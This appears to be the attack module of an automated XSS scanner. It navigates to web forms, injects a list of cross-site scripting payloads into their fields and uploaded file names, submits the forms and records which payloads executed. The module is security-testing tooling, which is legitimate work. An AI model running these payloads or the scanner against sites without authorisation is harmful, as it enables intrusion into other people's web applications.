const chalk = require('chalk');
const util = require('../common-utils/util');
const fs = require('fs');
const path = require('path');

const infoColor = chalk.bold.hex('#ff5f15');
const errorColor = chalk.bold.red;
const successColor = chalk.bold.greenBright;
const formAttackColor = chalk.hex('#8731E8');
const strayInputAttackColor = chalk.hex('#e231e8');


class AttackModule {
    constructor(pageWrapper, startUrl, loginModule) {
        this.pageWrapper = pageWrapper;
        this.startUrl = startUrl;
        this.loginModule = loginModule;
        this.page = pageWrapper.getPageObj();

        this.attackLookupTable = {};
        this.outputFilepath = util.getOutputFilepath('successful xss');

        // Create a folder for dynamically generated payload files
        this.payloadFolder = path.join(__dirname, '../../payload-files/');
        this.resetPayloadFolder();
    }


    async attack(urls, formObjects) {
        console.log(infoColor('[INFO] Starting attack phase!'));

        // TODO: Iterate over urls, visit them and track forms (?)

        let formCounter = 0;
        // Attack all forms
        for (let formObject of formObjects) {
            console.log(formAttackColor('Attacking form #', formCounter));
            formCounter += 1;
            let attackSuccessful = await this.pageWrapper.retryOnDestroyedContext(() => this.attackForm(formObject, true));
            if (attackSuccessful === 'not found') {
                continue;
            }
            if (!attackSuccessful) {
                // If attacking in safe mode was unsuccessful, try aggressive mode
                await this.pageWrapper.retryOnDestroyedContext(() => this.attackForm(formObject, false));
            }
        }
    }


    // Loosely implements Black Widow's path_attack_form() method
    async attackForm(formObject, safeMode) {
        if (safeMode) {
            console.log(formAttackColor('Attacking form', JSON.stringify(formObject)));
        } else {
            console.log(formAttackColor.italic('Starting aggressive attack (if possible) ...'));
        }

        let payloadTemplates = this.getPayloadTemplates();
        for (let payloadTemplate of payloadTemplates) {
            // Navigate to the URL containing the form and check whether it is present
            let form = await this.navigateToForm(formObject);
            if (!form) {
                console.log(errorColor('[!] Could not find form!'));
                return 'not found';
            }

            // Payload injection and form submission
            await this.injectFormPayloads(formObject, form, payloadTemplate, safeMode);
            await this.pageWrapper.submitForm(form);

            // Inspect whether XSS was triggered
            let attackSuccessful = await this.inspectAttack();
            if (attackSuccessful) {
                return true;
            }
        }

        return false;
    }


    async navigateToForm(formObject) {
        await this.pageWrapper.goto(formObject.containingUrl);
        await this.loginModule.loginIfPossible();
        let form = await this.pageWrapper.getOriginalFormElem(formObject);
        if (form !== undefined) {
            return form;
        }
        // Trying to find from the top
        await this.pageWrapper.goto(this.startUrl);
        await this.loginModule.loginIfPossible();
        await this.pageWrapper.loadTrace(formObject.trace);
        await this.pageWrapper.replayTrace();
        return await this.pageWrapper.getOriginalFormElem(formObject);
    }


    // Corresponds to fix_form()
    async injectFormPayloads(formObject, form, payloadTemplate, safeMode) {
        let formElems = await this.pageWrapper.getFormElements(form);

        // Check whether aggressive mode should be skipped
        const aggressiveTypes = ['hidden', 'radio', 'checkbox', 'select', 'file'];
        let allowAggressiveMode = false;
        if (!safeMode) {
            for (let formElem of formElems) {
                let aggressiveTypeFound = await formElem.evaluate((el, aggressiveTypes) => {
                    return aggressiveTypes.includes(el.type);
                }, aggressiveTypes);

                if (aggressiveTypeFound) {
                    allowAggressiveMode = true;
                    break;
                }
            }
        }

        // Inject payload into all input elements of suitable type
        for (let formElem of formElems) {
            let {id, payload} = this.armPayloadTemplate(payloadTemplate);
            let elemHTML = undefined;

            // SAFE MODE
            if (safeMode) {
                let inputTypes = ['text', 'textarea', 'password', 'email'];
                elemHTML = await this.injectPayload(formElem, payload, inputTypes);

            // AGGRESSIVE MODE
            } else if (allowAggressiveMode) {
                let inputTypes = ['text', 'textarea', 'password', 'email', 'hidden', 'radio', 'checkbox', 'select'];
                elemHTML = await this.injectPayload(formElem, payload, inputTypes);

                // If we have an input element for files, upload a payload file (only in aggressive mode)
                let isFileInput = !elemHTML && await formElem.evaluate((el) => el.type === 'file');
                if (isFileInput) {
                    payload = this.createPayloadFile(id);
                    await formElem.uploadFile(payload);
                    elemHTML = await formElem.evaluate(el => el.outerHTML);
                }
            }

            if (elemHTML) {
                console.log(formAttackColor(`\t [ID #${id}] Injected payload ${payload}.`));
                this.addLookupTableEntry(id, payload, {'formObj': formObject, 'elemHTML': elemHTML});
            }
        }
    }


    async injectPayload(formElem, payload, inputTypes) {
        let elemHTML = undefined;

        try {
            elemHTML = await formElem.evaluate((el, payload, inputTypes) => {
                if (inputTypes.includes(el.type)) {
                    el.value = payload;
                    return el.outerHTML;
                } else {
                    // Set default value if we do not inject a payload (roughly modeled after BW's behavior)
                    switch (el.type) {
                        case 'radio':
                            el.click();
                            break;
                        case 'checkbox':
                            el.checked = true;
                            break;
                        case 'select':
                            if (el.selectedIndex === 0 && el.length > 1) {
                                el.selectedIndex = 1;
                            }
                            break;
                        case 'number':
                            el.value = '1';
                            break;
                        case 'button':
                        case 'submit':
                        case 'image':
                            break;
                        default:
                            el.value = 'placeholder';
                    }
                }
            }, payload, inputTypes);
        } catch (e) {
            console.log(errorColor('[!] Error occurred when trying to inject payload:', e));
        }

        return elemHTML;
    }


    async inspectAttack() {
        let currentUrl = this.pageWrapper.getUrl();
        let successfulXSS = new Set();

        // Attribute injections
        let attributeInjectElems = await this.page.$x('//*[@jaekpot-attribute]');
        let attributeInjectIds = [];
        for (let attributeInjectElem of attributeInjectElems) {
            let id = await attributeInjectElem.evaluate((el) => {
                return parseInt(el.getAttribute('jaekpot-attribute'));
            });
            attributeInjectIds.push(id);
        }
        attributeInjectIds = attributeInjectIds.filter((id) => typeof id === 'number');

        // "xss_array" injections
        let xssArrayIds = await this.page.evaluate(() => {
            return xss_array;
        })

        attributeInjectIds.concat(xssArrayIds).forEach((id) => {
            successfulXSS.add(id);
            this.addLookupTableReflection(id, currentUrl);
        });

        // Save successful attacks to file
        if (successfulXSS.size > 0) {
            let stream = fs.createWriteStream(this.outputFilepath, {flags:'a+'});

            for (let id of successfulXSS) {
                let attackEntry = this.getLookupTableEntry(id);
                let formattedEntry = JSON.stringify(attackEntry,
                    (key, value) => value instanceof Set ? [...value] : value,  // Convert sets to arrays
                    '\t');
                stream.write(formattedEntry + '\n');

                console.log(successColor('-'.repeat(50)));
                console.log(successColor('Found vulnerability:'));
                console.log(successColor(formattedEntry));
                console.log(successColor('-'.repeat(50)));
            }

            stream.end();
        }

        return successfulXSS.size > 0;
    }


    createPayloadFile(id) {
        let payload = `<img src=x onerror=xss(${id})>`;
        let filepath = path.join(this.payloadFolder, payload);
        fs.writeFileSync(filepath, payload);
        return filepath;
    }


    resetPayloadFolder() {
        // Empty the folder contents from previous runs by deleting and recreating the directory
        fs.rmSync(this.payloadFolder, { recursive: true, force: true });
        fs.mkdirSync(this.payloadFolder, { recursive: true });
    }


    getPayloadTemplates() {
        const placeholder = '%RAND';
        return [
            `<script>xss(${placeholder})</script>`,
            `"'><script>xss(${placeholder})</script>`,
            `<img src="x" onerror="xss(${placeholder})">`,
            `<a href="" jaekpot-attribute="${placeholder}">jaekpot</a>`,
            `x" jaekpot-attribute="${placeholder}" fix=" `,
            `x" onerror="xss(${placeholder})"`,
            `</title></option><script>xss(${placeholder})</script>`
        ];
    }


    armPayloadTemplate(payloadTemplate) {
        let id = String(Math.floor((Math.random() * 100000000) + 1));
        let payload = payloadTemplate.replace('%RAND', id);
        return {'id': id, 'payload': payload};
    }


    getLookupTableEntry(id) {
        return this.attackLookupTable[id];
    }


    addLookupTableEntry(id, payload, injectionPoint) {
        this.attackLookupTable[id] = {
            'payload': payload,
            'injectionPoint': injectionPoint,
            'reflected': new Set()
        };
    }


    addLookupTableReflection(id, reflectionUrl) {
        if (id in this.attackLookupTable) {
            this.attackLookupTable[id]['reflected'].add(reflectionUrl);
        }
    }
}


module.exports = AttackModule